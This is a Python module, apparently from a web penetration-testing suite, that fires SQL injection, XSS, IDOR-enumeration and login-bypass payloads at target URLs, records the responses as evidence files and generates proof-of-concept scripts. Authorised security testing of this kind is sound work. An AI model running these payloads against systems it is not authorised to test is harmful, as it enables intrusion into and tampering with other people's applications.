#!/usr/bin/env python3

"""
📋 Evidence Collector - Comprehensive vulnerability validation and evidence gathering
Validates vulnerabilities and collects professional-grade evidence for reports
"""

import requests
import time
import json
import logging
from pathlib import Path
from datetime import datetime
from urllib.parse import urljoin, urlparse
import base64

class EvidenceCollector:
    """Collects and validates evidence for discovered vulnerabilities"""
    
    def __init__(self, suite_root):
        self.suite_root = Path(suite_root)
        self.evidence_dir = self.suite_root / "results" / "evidence"
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        self.logger = self.setup_logging()
        
        # Request session for consistent headers
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
    
    def setup_logging(self):
        """Setup evidence collection logging"""
        log_file = self.suite_root / "logs" / "evidence_collector.log"
        log_file.parent.mkdir(exist_ok=True)
        
        logging.basicConfig(level=logging.INFO)
        logger = logging.getLogger(__name__)
        
        handler = logging.FileHandler(log_file)
        handler.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        
        return logger
    
    def validate_vulnerabilities(self, vulnerabilities):
        """Validate discovered vulnerabilities and collect evidence"""
        self.logger.info(f"Validating {len(vulnerabilities)} vulnerabilities")
        
        validated_vulns = []
        
        for vuln in vulnerabilities:
            self.logger.info(f"Validating {vuln['type']} at {vuln['target']}")
            
            try:
                validated_vuln = self.validate_single_vulnerability(vuln)
                if validated_vuln:
                    validated_vulns.append(validated_vuln)
                    
            except Exception as e:
                self.logger.error(f"Error validating vulnerability: {e}")
                # Still include unvalidated vulnerability but mark as such
                vuln['validation_error'] = str(e)
                vuln['validated'] = False
                validated_vulns.append(vuln)
        
        self.logger.info(f"Validation complete. {len(validated_vulns)} vulnerabilities processed")
        return validated_vulns
    
    def validate_single_vulnerability(self, vuln):
        """Validate a single vulnerability with evidence collection"""
        vuln_type = vuln['type']
        
        if vuln_type == "SQL Injection":
            return self.validate_sql_injection(vuln)
        elif vuln_type == "Cross-Site Scripting":
            return self.validate_xss(vuln)
        elif vuln_type == "Insecure Direct Object Reference":
            return self.validate_idor(vuln)
        elif vuln_type == "Authentication Bypass":
            return self.validate_auth_bypass(vuln)
        else:
            # Generic validation
            return self.validate_generic(vuln)
    
    def validate_sql_injection(self, vuln):
        """Validate SQL injection with time-based and error-based detection"""
        target_url = vuln['target']
        evidence = []
        
        try:
            # Time-based validation
            time_payloads = [
                "' AND SLEEP(5) --",
                "' OR SLEEP(5) --", 
                "'; WAITFOR DELAY '00:00:05' --",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))x) --"
            ]
            
            for payload in time_payloads:
                start_time = time.time()
                
                try:
                    response = self.session.get(
                        target_url, 
                        params={'id': payload}, 
                        timeout=10
                    )
                    
                    end_time = time.time()
                    response_time = end_time - start_time
                    
                    if response_time >= 4:  # Significant delay indicates SQLi
                        evidence.append({
                            "type": "time_based_sqli",
                            "payload": payload,
                            "response_time": response_time,
                            "status_code": response.status_code,
                            "timestamp": datetime.now().isoformat()
                        })
                        
                        vuln['validated'] = True
                        vuln['confidence'] = "High"
                        break
                        
                except requests.RequestException:
                    continue
            
            # Error-based validation
            error_payloads = [
                "'", 
                "''", 
                "'\"",
                "' OR '1'='1",
                "' UNION SELECT 1,2,3--"
            ]
            
            for payload in error_payloads[:2]:  # Limit to prevent too many requests
                try:
                    response = self.session.get(
                        target_url,
                        params={'id': payload},
                        timeout=5
                    )
                    
                    # Check for SQL error indicators
                    sql_errors = [
                        "mysql_fetch_array", "ORA-", "Microsoft JET Database",
                        "SQLServer JDBC Driver", "PostgreSQL query failed",
                        "Warning: mysql_", "Warning: pg_", "valid MySQL result",
                        "MySqlClient.", "com.mysql.jdbc.exceptions"
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            evidence.append({
                                "type": "error_based_sqli", 
                                "payload": payload,
                                "error_indicator": error,
                                "status_code": response.status_code,
                                "timestamp": datetime.now().isoformat()
                            })
                            
                            vuln['validated'] = True
                            vuln['confidence'] = "High"
                            break
                            
                except requests.RequestException:
                    continue
            
            # Store evidence
            if evidence:
                evidence_file = self.store_evidence(vuln, evidence)
                vuln['evidence_file'] = str(evidence_file)
                vuln['evidence_count'] = len(evidence)
            
        except Exception as e:
            self.logger.error(f"SQL injection validation error: {e}")
            vuln['validation_error'] = str(e)
        
        return vuln
    
    def validate_xss(self, vuln):
        """Validate XSS vulnerability with reflection and DOM analysis"""
        target_url = vuln['target']
        evidence = []
        
        try:
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "'><script>alert('XSS')</script>"
            ]
            
            for payload in xss_payloads[:3]:  # Limit requests
                try:
                    # Test in different parameters
                    params_to_test = ['q', 'search', 'name', 'input', 'data']
                    
                    for param in params_to_test[:2]:  # Limit parameter testing
                        response = self.session.get(
                            target_url,
                            params={param: payload},
                            timeout=5
                        )
                        
                        # Check if payload is reflected unescaped
                        if payload in response.text:
                            evidence.append({
                                "type": "reflected_xss",
                                "payload": payload,
                                "parameter": param,
                                "reflected": True,
                                "status_code": response.status_code,
                                "timestamp": datetime.now().isoformat()
                            })
                            
                            vuln['validated'] = True
                            vuln['confidence'] = "High"
                            break
                            
                except requests.RequestException:
                    continue
            
            if evidence:
                evidence_file = self.store_evidence(vuln, evidence)
                vuln['evidence_file'] = str(evidence_file)
                
        except Exception as e:
            self.logger.error(f"XSS validation error: {e}")
            vuln['validation_error'] = str(e)
        
        return vuln
    
    def validate_idor(self, vuln):
        """Validate IDOR vulnerability with ID enumeration"""
        target_url = vuln['target']
        evidence = []
        
        try:
            # Test ID parameters
            id_params = ['id', 'user_id', 'account_id', 'profile_id', 'document_id']
            
            for param in id_params[:2]:  # Limit testing
                # Test with different ID values
                test_ids = ['1', '2', '999', '1000', 'admin', '0']
                
                responses = []
                for test_id in test_ids[:3]:  # Limit requests
                    try:
                        response = self.session.get(
                            target_url,
                            params={param: test_id},
                            timeout=5
                        )
                        
                        responses.append({
                            "id": test_id,
                            "status_code": response.status_code,
                            "content_length": len(response.text),
                            "response_hash": hash(response.text)
                        })
                        
                    except requests.RequestException:
                        continue
                
                # Analyze responses for IDOR indicators
                if len(responses) >= 2:
                    # Check if different IDs return different content
                    content_hashes = [r['response_hash'] for r in responses]
                    if len(set(content_hashes)) > 1:  # Different responses indicate potential IDOR
                        evidence.append({
                            "type": "idor_enumeration",
                            "parameter": param,
                            "responses": responses,
                            "different_content": True,
                            "timestamp": datetime.now().isoformat()
                        })
                        
                        vuln['validated'] = True
                        vuln['confidence'] = "Medium"
            
            if evidence:
                evidence_file = self.store_evidence(vuln, evidence)
                vuln['evidence_file'] = str(evidence_file)
                
        except Exception as e:
            self.logger.error(f"IDOR validation error: {e}")
            vuln['validation_error'] = str(e)
        
        return vuln
    
    def validate_auth_bypass(self, vuln):
        """Validate authentication bypass vulnerability"""
        target_url = vuln['target']
        evidence = []
        
        try:
            # Test common auth bypass techniques
            bypass_payloads = [
                {"username": "admin'--", "password": "anything"},
                {"username": "admin", "password": "' OR '1'='1"},
                {"username": "' OR 1=1--", "password": ""},
                {"username": "admin", "password": "admin"},
            ]
            
            for payload in bypass_payloads[:2]:  # Limit requests
                try:
                    response = self.session.post(
                        target_url,
                        data=payload,
                        timeout=5,
                        allow_redirects=False
                    )
                    
                    # Look for successful authentication indicators
                    success_indicators = [
                        "dashboard", "welcome", "logout", "profile",
                        "admin panel", "redirect", response.status_code in [302, 301]
                    ]
                    
                    is_successful = any(
                        indicator in response.text.lower() 
                        for indicator in success_indicators[:4]
                    ) or response.status_code in [301, 302]
                    
                    if is_successful:
                        evidence.append({
                            "type": "auth_bypass",
                            "payload": payload,
                            "status_code": response.status_code,
                            "redirect_location": response.headers.get('Location'),
                            "success_indicators": success_indicators,
                            "timestamp": datetime.now().isoformat()
                        })
                        
                        vuln['validated'] = True
                        vuln['confidence'] = "High"
                        break
                        
                except requests.RequestException:
                    continue
            
            if evidence:
                evidence_file = self.store_evidence(vuln, evidence)
                vuln['evidence_file'] = str(evidence_file)
                
        except Exception as e:
            self.logger.error(f"Auth bypass validation error: {e}")
            vuln['validation_error'] = str(e)
        
        return vuln
    
    def validate_generic(self, vuln):
        """Generic validation for other vulnerability types"""
        try:
            # Basic connectivity check
            response = self.session.get(vuln['target'], timeout=5)
            
            vuln['validated'] = True
            vuln['confidence'] = "Low"
            vuln['response_status'] = response.status_code
            vuln['server_header'] = response.headers.get('Server', 'Unknown')
            
        except Exception as e:
            vuln['validation_error'] = str(e)
            vuln['validated'] = False
        
        return vuln
    
    def store_evidence(self, vuln, evidence):
        """Store collected evidence to files"""
        # Create target-specific evidence directory
        target_name = urlparse(vuln['target']).netloc or 'unknown'
        target_dir = self.evidence_dir / target_name
        target_dir.mkdir(exist_ok=True)
        
        # Create evidence file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        vuln_type_safe = vuln['type'].replace(' ', '_').lower()
        evidence_file = target_dir / f"{vuln_type_safe}_{timestamp}.json"
        
        evidence_package = {
            "vulnerability": vuln,
            "evidence": evidence,
            "collection_timestamp": datetime.now().isoformat(),
            "validation_method": "Automated with manual verification recommended"
        }
        
        with open(evidence_file, 'w') as f:
            json.dump(evidence_package, f, indent=2, default=str)
        
        self.logger.info(f"Evidence stored: {evidence_file}")
        return evidence_file
    
    def generate_poc_script(self, vuln):
        """Generate proof-of-concept exploitation script"""
        vuln_type = vuln['type']
        
        if vuln_type == "SQL Injection":
            return self.generate_sqli_poc(vuln)
        elif vuln_type == "Cross-Site Scripting":
            return self.generate_xss_poc(vuln)
        else:
            return self.generate_generic_poc(vuln)
    
    def generate_sqli_poc(self, vuln):
        """Generate SQL injection PoC script"""
        poc_script = f'''#!/usr/bin/env python3
"""
SQL Injection Proof of Concept
Target: {vuln['target']}
Discovered: {vuln['timestamp']}
"""

import requests

def exploit_sqli():
    target_url = "{vuln['target']}"
    payload = "{vuln['payload']}"
    
    response = requests.get(target_url, params={{'id': payload}})
    
    print(f"Response Status: {{response.status_code}}")
    print(f"Response Length: {{len(response.text)}}")
    
    if "mysql_fetch_array" in response.text.lower():
        print("SQL Error detected - vulnerability confirmed")
    
if __name__ == "__main__":
    exploit_sqli()
'''
        return poc_script
    
    def generate_xss_poc(self, vuln):
        """Generate XSS PoC script"""
        poc_script = f'''#!/usr/bin/env python3
"""
XSS Proof of Concept
Target: {vuln['target']}
Discovered: {vuln['timestamp']}
"""

import requests

def exploit_xss():
    target_url = "{vuln['target']}"
    payload = "{vuln['payload']}"
    
    response = requests.get(target_url, params={{'q': payload}})
    
    print(f"Response Status: {{response.status_code}}")
    
    if payload in response.text:
        print("XSS payload reflected - vulnerability confirmed")
        print("Payload executed in browser context")
    
if __name__ == "__main__":
    exploit_xss()
'''
        return poc_script
    
    def generate_generic_poc(self, vuln):
        """Generate generic PoC script"""
        poc_script = f'''#!/usr/bin/env python3
"""
{vuln['type']} Proof of Concept
Target: {vuln['target']}
Discovered: {vuln['timestamp']}
"""

import requests

def exploit_vulnerability():
    target_url = "{vuln['target']}"
    
    # Vulnerability validation
    response = requests.get(target_url)
    print(f"Target accessible: {{response.status_code == 200}}")
    print(f"Vulnerability type: {vuln['type']}")
    print(f"Potential impact: {vuln['impact']}")

if __name__ == "__main__":
    exploit_vulnerability()
'''
        return poc_script